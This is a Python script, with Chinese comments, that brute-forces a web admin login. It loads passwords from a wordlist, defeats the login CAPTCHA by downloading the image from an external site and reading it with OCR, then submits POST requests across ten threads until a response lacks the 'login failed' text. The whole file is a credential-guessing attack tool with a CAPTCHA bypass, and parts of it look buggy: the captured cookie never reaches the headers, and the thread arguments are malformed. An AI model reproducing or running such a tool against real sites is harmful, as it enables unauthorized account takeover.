'''
基本思路：
    通过验证码地址获取cookie信息，用此cookie访问登录地址，来保证验证码不变
    然后将验证码图片保存到本地，调用pytesseract模块对验证码图片进行识别，返回验证码
    构造要提交的信息，获取返回的数据，如果数据中不存在“登录失败”则表明登录成功
    创造多线程，提高程序运行的速度
'''
#导入相应
import urllib.request
import urllib.parse
from PIL import Image
import pytesseract
from http import cookiejar
import re
import threading

code_path = "i:\\code.jpg"

url = "http://localhost:8101/admin/Redirect.asp"

password_list = []

pass_file = 'passwd.txt'

threads = 10

cookie = ''

# 获取验证码并且将验证码读出返回
def know_code(code_path):

    global cookie

    code_src = 'http://www.6zhiyun.com/yimaoinclude/code.php?t=0.09701541587602969'
    # 创建cookie容器存放cookie
    cookie_docker = cookiejar.CookieJar()

    handler = urllib.request.HTTPCookieProcessor(cookie_docker)

    opener = urllib.request.build_opener(handler)

    response = opener.open(code_src)

    for item in cookie_docker:
        cookie = item.value
    urllib.request.urlretrieve(code_src,code_path)
    print("Save Success")
    image = Image.open(code_path)
    code = pytesseract.image_to_string(image)
    return code

# 构造请求头信息
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
           "Referer":"http://localhost:8101/admin/admin_login.asp",
           "Content-Type":"application/x-www-form-urlencoded",
           "Cookie":cookie,
           }

#提交表单信息
def brute(username,password):

    code = know_code(code_path)
    values = {
        "loginname" : username,
        "loginpass" : password,
        "submit.x"  : 19,
        "submit.y"  : 12,
        "yzm"       : code
    }
    data = urllib.parse.urlencode(values).encode('utf-8')
    req = urllib.request.Request(method="POST",url=url,data=data,headers=headers)
    response = urllib.request.urlopen(req)
    html = response.read().decode('GB2312')
    return html

# 不断地获取密码进行表单的提交，最后根据返回数据判断是否登录成功
def passwd(pass_file):
    username = ''
    fd = open(pass_file, 'r')
    raw_words = fd.readlines()
    fd.close()

    for password in raw_words:
        password = password.rstrip()
        if password:
            password_list.append(password)
        else:
            pass
    for pass_word in password_list:
        html = brute(username,pass_word)
        if re.findall(r'登录失败',html):
            pass
        else:
            print("The username: %s and password: %s is right !",username,pass_word)
# 多线程运行
for i in range(threads):
    t = threading.Thread(target=passwd,args=pass_file)
    t.start()

